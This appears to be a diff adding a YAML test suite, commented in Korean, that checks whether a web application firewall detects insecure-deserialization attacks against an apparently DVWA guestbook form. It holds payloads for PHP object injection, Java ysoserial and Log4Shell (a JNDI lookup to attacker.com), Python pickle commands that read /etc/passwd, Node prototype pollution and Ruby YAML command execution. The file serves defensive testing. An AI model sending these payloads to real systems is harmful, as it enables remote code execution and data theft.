@@ -1,0 +1,151 @@
+# =============================================================================
+# Insecure Deserialization Test Cases
+# =============================================================================
+# PHP/Python/Java 역직렬화 취약점을 통한 WAF 탐지 능력 검증
+# =============================================================================
+
+category: "insecure_deserialization"
+name: "Insecure Deserialization"
+description: "안전하지 않은 역직렬화 공격 탐지 테스트"
+severity: "critical"
+icon: "🧊"
+
+tests:
+  # --- PHP Serialization ---
+  - id: "deser-001"
+    description: "PHP - 객체 삽입 (Object Injection)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "O:8:\"stdClass\":0:{}"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-002"
+    description: "PHP - 명령 실행 객체"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "O:8:\"shell_exec\":1:{s:2:\"id\";}"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-003"
+    description: "PHP - Magic Method __destruct 이용"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "O:10:\"TestObject\":1:{s:4:\"data\";s:10:\"malicious\";}"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "deser-004"
+    description: "PHP - Gadget Chain (PHPGGC 스타일)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "a:1:{i:0;O:8:\"RCE\":1:{s:4:\"code\";s:2:\"id\";}}"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- Java Deserialization ---
+  - id: "deser-005"
+    description: "Java - Base64 인코딩 직렬화 객체 (ysoserial 패턴)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVElFZE1hcEVudHJ5ix3Q8B9RqgsCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAAF2cQB+AAF4cHQA"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-006"
+    description: "Java - CommonsCollections Gadget 체인 시그니처"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "org.apache.commons.collections.functors.InvokerTransformer"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-007"
+    description: "Java - Log4Shell JNDI Lookup 패턴"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "${jndi:ldap://attacker.com/a}"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-008"
+    description: "Java - Log4Shell 변형 ${env:}"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "${env:JAVA_HOME}"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "deser-009"
+    description: "Java - RMI 원격 객체 참조"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "java.rmi.server.RemoteObjectInvocationHandler"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  # --- Python Pickle ---
+  - id: "deser-010"
+    description: "Python Pickle - __reduce__ 명령 실행"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "c__builtin__\nsystem\n(S'id'\ntR."
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-011"
+    description: "Python Pickle - os.system('cat /etc/passwd')"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "cos\nsystem\n(S'cat /etc/passwd'\ntR."
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "deser-012"
+    description: "Python Pickle - eval + subprocess"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "csubprocess\ncheck_output\n(S'id'\nS'shell'\nItR."
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- Node.js / Express ---
+  - id: "deser-013"
+    description: "Node.js - __proto__ pollution 시그니처"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "{\"__proto__\":{\"isAdmin\":true}}"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "deser-014"
+    description: "Node.js - constructor.prototype 조작"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "{\"constructor\":{\"prototype\":{\"shell\":\"id\"}}}"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "deser-015"
+    description: "Ruby - YAML.load 명령 실행"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "--- !ruby/object:ERB\nsrc: \"`id`\"\n"
+      btnSign: "Sign Guestbook"
+    severity: "high"
